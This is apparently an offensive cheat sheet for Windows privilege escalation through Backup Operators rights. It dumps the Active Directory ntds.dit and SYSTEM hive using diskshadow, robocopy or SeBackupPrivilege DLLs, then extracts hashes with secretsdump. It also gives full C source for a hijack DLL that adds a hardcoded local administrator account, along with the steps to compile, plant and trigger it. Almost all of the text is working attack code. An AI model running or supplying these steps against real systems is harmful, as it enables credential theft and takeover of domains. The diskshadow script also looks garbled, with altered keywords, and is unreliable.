# diskshadow/robocopy

1. Grab SYSTEM
```bash
reg save HKLM\SYSTEM C:\TEMP\Documents\SYSTEM
```

2. Create shadowcopy.txt
```bash
→ cat shadowscript.txt
set metadata C:\Windows\System32\spool\drivers\color\sss.cabs
set context clientaccessibles
set context persistents
begin backups
add volume c: alias coldfx#
creates
expose %coldfx% z:#
```

3. execute the script with diskshadow
```bash
diskshadow /s shadowscript.txt
```

4. copy
```bash
cd C:\TEMP
robocopy /B z:\Windows\ntds .\new_ntds ntds.dit
```

5. secretsdump(on Kali linux)
```bash
impacket-secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

# diskshadow/Copy-FileSeBackupPrivilege
1,2,3,5 same as above method
4. An alternate way to copy files from the shadow drive Z:\ is by uploading SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll from SeBackupPrivilege repo and importing them to our session: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

```bash
> Import-Module .\SeBackupPrivilegeUtils.dll
> Import-Module .\SeBackupPrivilegeCmdLets.dll
> Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\TEMP\ntds.dit
```

# DLL Hijack
Since the user is an member of Backup Operator Group, the user is allowed to write files anywhere on the system.
For DLL hijacking, the malicious windowscoredeviceinfo.dll(create a new user with credentials coldfusion:c0!dfusion and add it to local administrators group) will be created by using the following code:

1. Create dll
```bash
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int pwn()
{
        WinExec("C:\\Windows\\System32\\net.exe users coldfusion c0!dfusion /add", 0);
        WinExec("C:\\Windows\\System32\\net.exe localgroup administrators coldfusion /add", 0);
        return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
)
{
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
                pwn();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
}
```

2. Compiling the dll on Kali linux:
```bash
x86_64-w64-mingw32-gcc dllhijack.c -shared -o windowscoredeviceinfo.dll
```

3. UsoDllLoader.exe can be downloaded from here: https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824

4. copy windowscoredeviceinfo.dll from C:\temp\ to c:\windows\system32
```bash
robocopy /b dll c:\windows\system32 windowscoredeviceinfo.dll
```

5. Trigger dll
```bash
.\UsoDllLoader.exe
```

6. We can see new user coldfusion has been created with local administrator privileges
